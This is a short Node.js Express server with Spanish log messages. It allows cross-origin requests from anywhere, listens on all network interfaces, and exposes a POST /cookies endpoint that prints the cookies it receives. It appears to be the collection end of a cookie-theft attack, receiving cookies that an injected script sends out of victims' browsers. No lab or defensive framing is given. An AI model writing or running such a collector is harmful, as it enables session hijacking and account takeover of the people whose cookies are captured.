require('dotenv').config();

const express = require('express');
const cors = require('cors')
const app = express();

app.use(cors());
app.use(express.json());

const ip = process.env.SERVER_IP || '127.0.0.1'
const port = process.env.SERVER_PORT || 3000

app.post('/cookies', (req, res) => {
    const cookies = req.body.cookies;
    console.log('Cookies recibidas:', cookies);

    res.send('Cookies recibidas');
});

app.listen(port, '0.0.0.0',() => {
    console.log(`Servidor escuchando en todas las interfaces en el puerto ${port}`);
});
